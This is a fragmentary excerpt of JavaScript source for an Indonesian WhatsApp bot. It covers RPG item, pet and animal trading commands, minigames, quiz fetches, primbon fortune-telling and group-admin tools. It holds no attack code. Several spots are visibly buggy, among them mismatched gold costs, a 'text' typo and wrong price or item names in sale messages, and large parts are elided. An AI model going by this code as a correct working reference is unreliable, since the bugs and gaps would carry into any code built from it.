if (user.pickaxe == 0) return yoshreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.rock < 20 || user.wood < 20 || user.iron < 20 ) return yoshreply(`Barang tidak cukup!`)
 user.rock -= 20
 user.wood -= 20
 user.iron -= 20
 user.diamond -= 1
 user.pickaxedurability = 100
yoshreply("Sukses memperbaiki!")
break
//=================================================//
case 'sword':
if (user.sworddurability > 99) return yoshreply('Tools ini belum memiliki kerusakan')
if (user.sword == 0) return yoshreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.wood < 20 || user.iron < 20 || user.gold < 2 ) return yoshreply(`Barang tidak cukup!`)
 user.wood -= 20
 user.iron -= 20
 user.gold -= 3
 user.diamond -= 1
...
//=================================================//
case 'fishingrod':
if (user.fishingroddurability > 99) return yoshreply('Tools ini belum memiliki kerusakan')
if (user.fishingrod == 0) return yoshreply('Kamu belum memiliki ini')
if(user.diamond < 1 || user.string < 20 || user.wood < 20 || user.iron < 20 ) return yoshreply(`Barang tidak cukup!`)
 user.wood -= 20
 user.string -= 20
 user.iron -= 20
 user.diamond -= 1
...
//=================================================//
case 'armor':
if (user.armordurability > 99) return yoshreply('Tools ini belum memiliki kerusakan')
if (user.armor == 0) return yoshreply('Kamu belum memilik ini')
if(user.diamond < 1 || user.iron < 15 || user.gold < 2 ) return yoshreply(`Barang tidak cukup!`)
 user.iron -= 15
 user.gold -= 2
 user.diamond -= 1
...
default:
return yoshcss.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
yoshreply("Error\n\n\n" + err.stack)
...
let command_link = `wa.me/${yoshcssuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
let share_text = `
...
switch (type) {
case 'cat':
if (user.cat > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hcat) return yoshreply(`Pet Token anda kurang`)
db.data.users[m.sender].pet -= hcat
db.data.users[m.sender].cat += 1
yoshreply("Selamat anda mempunyai pet Baru ! 🎉")
break
//=================================================//
case 'dog':
if (user.dog > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hdog) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'fox':
if (user.fox > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hfox) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'horse':
if (user.horse > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hhorse) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'robo':
if (user.robo > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hrobo) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'lion':
if (user.lion > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hlion) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'rhinoceros':
if (user.rhinoceros > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hrhinoceros) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'dragon':
if (user.dragon > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hdragon) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'centaur':
if (user.centaur > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hcentaur) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'kyubi':
if (user.kyubi > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hkyubi) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'griffin':
if (user.griffin > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hgriffin) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'phonix':
if (user.phonix > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hphonix) return yoshreply(`Pet Token anda kurang`)
...
//=================================================//
case 'wolf':
if (user.wolf > 0) return yoshreply('Kamu sudah memilik ini')
if(user.pet < hwolf) return yoshreply(`Pet Token anda kurang`)
...
try {
yoshcss.tembak = yoshcss.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {
...
if(yoshcss.tembak.tembak.indexOf("🤠") == 0) {
yoshcss.tembak.tembak = kiri[0]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 1) {
yoshcss.tembak.tembak = kiri[0]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 2) {
yoshcss.tembak.tembak = kiri[1]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 3) {
yoshcss.tembak.tembak = kiri[2]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 4) {
yoshcss.tembak.tembak = kiri[3]
}

let pos = yoshcss.tembak.musuh.join(" ") + "\n\n\n" + yoshcss.tembak.tembak.join(" ")



if(yoshcss.tembak.musuh.indexOf("🥷") === yoshcss.tembak.tembak.indexOf("🤠")) return yoshcss.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return yoshcss.sendButton(m.chat, pos, wm, [
...
if(yoshcss.tembak.tembak.indexOf("🤠") == 0) {
yoshcss.tembak.tembak = kanan[1]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 1) {
yoshcss.tembak.tembak = kanan[2]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 2) {
yoshcss.tembak.tembak = kanan[3]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 3) {
yoshcss.tembak.tembak = kanan[4]
} else if(yoshcss.tembak.tembak.indexOf("🤠") == 4) {
yoshcss.tembak.tembak = kanan[4]
}
...
if(yoshcss.tembak.tembak.indexOf("🤠") == yoshcss.tembak.musuh.indexOf("🥷")) {
yoshcss.tembak = {}
db.data.users[m.sender].money += 1000
yoshreply("Kamu menang!\n\nUang += 1000")
}
...
yoshcss.tembak.musuh = musuh
yoshcss.tembak.tembak = aku
...
yoshreply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else yoshreply( `Banteng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'harimau':
...
yoshreply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else yoshreply( `Harimau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gajah':
...
yoshreply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else yoshreply( `Gajah Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kambing':
...
yoshreply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else yoshreply( `Kambing Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'panda':
...
yoshreply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else yoshreply( `Panda Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buaya':
...
yoshreply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else yoshreply( `Buaya Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kerbau':
...
yoshreply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else yoshreply( `Kerbau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'sapi':
...
yoshreply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else yoshreply( `Sapi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'monyet':
...
yoshreply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else yoshreply( `Monyet Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babi':
...
yoshreply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else yoshreply( `Babi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babihutan':
...
yoshreply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else yoshreply( `Babi Hutan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ayam':
...
yoshreply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else yoshreply( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
...
yoshreply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else yoshreply( `Kepiting Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ikan':
...
yoshreply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else yoshreply( `Ikan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'dory':
...
yoshreply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else yoshreply( `Ikan Dory Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gurita':
...
yoshreply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else yoshreply( `Gurita Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buntal':
...
yoshreply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else yoshreply( `Ikan Buntal Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'hiu':
...
yoshreply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else yoshreply( `Hiu Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'orca':
...
yoshreply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else yoshreply( `Paus Orca Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lumba':
...
yoshreply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else yoshreply( `Lumba Lumba Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'paus':
...
yoshreply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else yoshreply( `Paus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lobster':
...
yoshreply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else yoshreply( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
yoshreply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else yoshreply( `Udang Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'cumi':
...
yoshreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else yoshreply( `Cumi Kamu Tidak Cukup`.trim())
 break
//=================================================//
case 'botol':
...
yoshreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
} else yoshreply( `Botol Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kaleng':
...
yoshreply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else yoshreply( `Kaleng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kardus':
...
yoshreply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else yoshreply( `Kardus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gelas':
...
yoshreply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else yoshreply( `Gelas Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'plastik':
...
yoshreply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else yoshreply( `Plastik Kamu Tidak Cukup`.trim())
break
default:
return yoshreply(Kchat)
}
break
default:
return yoshreply(Kchat)
...
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
yoshreply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
} else yoshreply( `Botol Kamu Tidak Cukup`.trim())
break 
case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
...
let e = String(err)
yoshcss.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
...
if (new Date - user.lastmaling< 604800000) return yoshreply(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
...
setTimeout(() => {
yoshreply(`Yuk waktunya Maling lagi 👋…`)
}, timeout)
}
break
//=================================================//
...
if (user.umpan == 0) return yoshreply('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
if (user.fishingrod == 0 ) return yoshreply('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
if (new Date - user.lastmisi > 3600000) {
...
setTimeout(() => {
yoshreply(`Ini Dia Hasil Tangkapanmu`)
}, 18000)

setTimeout(() => {
yoshreply('Kamu Berhasil Menarik Ikan Keluar Dari Air')
}, 15000)

setTimeout(() => {
yoshreply('Kamu Menarik Kailmu')
}, 12000)

setTimeout(() => {
yoshreply('Kail Mu Di Tarik Ikan...')
}, 9000)

setTimeout(() => {
yoshreply('Kamu Sedang Memancing...')
}, 0)
user.lastmisi = new Date * 1
} else yoshreply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break
//=================================================//
case 'nguli': {
...
yoshreply('_🎉Selamat kamu mendapatkan +10 limit_')
db.data.users[m.sender].lastnguli = new Date * 1
} else yoshreply('[💬] Anda sudah mengklaim upah nguli hari ini')
}
break
//=================================================//
case 'ttc':
...
this.game = this.game ? this.game : {};
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return yoshreply('Kamu masih didalam game');
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
if (room) {
yoshreply('Partner ditemukan!');
room.o = m.chat;
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await yoshcss.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await yoshcss.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
...
yoshreply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
...
if (this.game) {
delete this.game;
yoshcss.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
yoshreply(`Session TicTacToe🎮 tidak ada`);
} else mewReply('?');
} catch (e) {
yoshreply('rusak');
}
...
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) yoshreply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return yoshreply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return yoshreply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
...
this.suit[id] = {
chat: await yoshcss.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) yoshcss.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
...
case 'kuismath':
case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let {
genMath,
modes
} = require('./lib/math.js');
if (!text) return yoshreply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh _useran: ${prefix}math medium`);
let result = await genMath(text.toLowerCase());
yoshcss.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban;
});
await sleep(result.waktu);
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
yoshreply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]]);
delete kuismath[m.sender.split('@')[0]];
}
}
break;
case 'tebak': {
if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
console.log("Jawaban: " + result.jawaban);
yoshcss.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
delete tebakgambar[m.sender.split('@')[0]];
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
yoshcss.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
...
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
let result = anu[Math.floor(Math.random() * anu.length)];
yoshcss.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
let result = anu[Math.floor(Math.random() * anu.length)];
yoshcss.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json');
let result = anu[Math.floor(Math.random() * anu.length)];
yoshcss.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
...
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return yoshreply("Masih Ada Sesi Yang Belum Diselesaikan!");
...
case 'afk':
if (!isGroup) return yoshreply('Only Group')
if (isAfkOn) return yoshreply("Kakak Sudah Afk Sebelumnya");
let reason = text ? text : 'Nothing.';
afk.addAfkUser(m.sender, Date.now(), reason, _afk);
yoshreply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`);
break

//Primbon
case "nomerhoki": case "nomorhoki": {
if (!Number(text)) return yoshreply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Nomor HP :* ${anu.message.nomer_hp}\n❋々 *Angka Shuzi :* ${anu.message.angka_shuzi}\n❋々 *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n❋々 *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
//=================================================//
case "artimimpi": case "tafsirmimpi": {
if (!text) return yoshreply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Mimpi :* ${anu.message.mimpi}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Solusi :* ${anu.message.solusi}`)
}
break
//=================================================//
case "ramalanjodoh": case "ramaljodoh": {
if (!text) return yoshreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
...
//=================================================//
case "artinama": {
if (!text) return yoshreply(`Example : ${prefix + command} Ryot`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "kecocokannama": case "cocoknama": {
if (!text) return yoshreply(`Example : ${prefix + command} Ryo, 7, 7, 2005`) 
...
if (!text) return yoshreply(`Example : ${prefix + command} Ryo|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return yoshreply(anu.message)
yoshcss.sendImage(m.chat,anu.message.gambar, `❋々 *Nama Anda :* ${anu.message.nama_anda}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case "jadianpernikahan": case "jadiannikah": {
if (!text) return yoshreply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Tanggal Pernikahan :* ${anu.message.tanggal}\n❋々 *karakteristik :* ${anu.message.karakteristik}`)
}
break
//=================================================//
case "sifatusaha": {
if (!ext) return yoshreply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Usaha :* ${anu.message.usaha}`)
}
break
//=================================================//
case "rejeki": case "rezeki": {
if (!text) return yoshreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
...
if (anu.status == false) return yoshreply(anu.message)
yoshcss.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
if (!text) return yoshreply(`Example : ${prefix + command} Ryo, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
...
//=================================================//
case "peruntungan": {
if (!text) return yoshreply(`Example : ${prefix + command} DIka, 7, 7, 2005, 2023\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`) 
...
//=================================================//
case "memancing": {
if (!text) return yoshreply(`Example : ${prefix + command} 12, 1, 2023`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Tanggal :* ${anu.message.tgl_memancing}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
//=================================================//
case "masasubur": {
if (!text) return yoshreply(`Example : ${prefix + command} 12, 1, 2023, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`) 
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return yoshreply(anu.message)
yoshreply(`❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
...
case 'lesbicek':
case 'ceklesbi': {
if (!q) return yoshreply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
...
//=================================================//
case 'kapankah': {
if (!q) return yoshreply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${prefix + command} Saya Jadi Istrinya Ryo Kun >////<`)
...
yoshreply(`Pertanyaan : bisakah ${q}\nJawaban : ${kah}`)
}
break
//=================================================//
case 'bisakah': {
if (!text) return yoshreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti ryo`)
...
//=================================================//
case 'apakah': {
if (!text) return yoshreply( `Example : ${prefix + command} ryo cakep`)
var apa = ['Iya', 'Tidak', 'Bisa Jadi', 'sepertinya', 'keknya sih iya', 'Betul']
var kah = apa[Math.floor(Math.random() * apa.length)]
yoshreply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
...
fs.unlinkSync(media)
if (err) return yoshreply(err)
let buff = fs.readFileSync(ran)
yoshcss.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else yoshreply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
yoshreply(e)
}
break
...
case 'tourl': {
yoshreply(mess.wait)
let media = await yoshcss.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
yoshreply(util.format(anu))
...
if (!isPremium) return yoshreply(mess.premium)
if (!isGroup) return yoshreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return yoshreply('Khusus Admin')
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
await yoshcss.groupRevokeInvite(m.chat).then((res) => yoshreply(`Sukses riset link group`)).catch((err) => yoshreply(jsonformat(err)))
}
break
//=================================================//
case 'infogc': {
if(!isGroup) return yoshreply("Hanya bisa di dalam group")
let _meta = await yoshcss.groupMetadata(m.chat)
console.log(_meta)
let _img = await yoshcss.profilePictureUrl(_meta.id, 'image') 
...
yoshreply(mess.wait)
try {
var ppimg = await yoshcss.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await yoshcss.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'closegroup': {
if (!isGroup) return yoshreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return yoshreply('Khusus Admin')
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
if (!args[0]) return yoshreply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
...
setTimeout(() => {
var nomor = m.participant
yoshcss.groupSettingUpdate(m.chat, 'not_announcement')
yoshreply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break
//=================================================//
...
//=================================================//
case 'hidetag':
if (!isGroup) return yoshreply(mess.only.group)
if (!isAdmins && !isDeveloper) return yoshreply('Khusus Admin')
if (!q) return yoshreply(`Teks Nya Mana Kak?`)
yoshcss.sendMessage(m.chat, {
    text: q,
    contextInfo: {
...
//=================================================//
case "tagall": {
if (!isDeveloper && !isAdmins) return yoshreply(mess.admin)
if (!isGroup) return yoshreply(mess.only.group)
if (!q) return yoshreply(`Teks Nya Mana Kak?`)
